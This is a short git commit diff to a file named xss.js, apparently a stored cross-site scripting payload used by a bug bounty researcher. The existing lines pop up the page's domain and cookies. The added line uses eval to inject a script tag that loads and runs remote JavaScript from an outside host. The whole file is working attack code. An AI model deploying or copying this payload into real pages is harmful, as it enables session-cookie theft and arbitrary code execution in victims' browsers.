acd8d36a495e718eba387ebb225b7a3c206e304e
am3ez/a <72428471+m3ez@users.noreply.github.com>
2024-09-01 16:14:24 +0700

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,2 +1,3 @@
 prompt("Stored XSS by Supakiad S. (m3ez):", document.domain);
 prompt("Stored XSS Popup Cookies:", document.cookie);
+eval('var a=document.createElement(\'script\');a.src=\'https://aacb.2y.vc\';document.body.appendChild(a)');
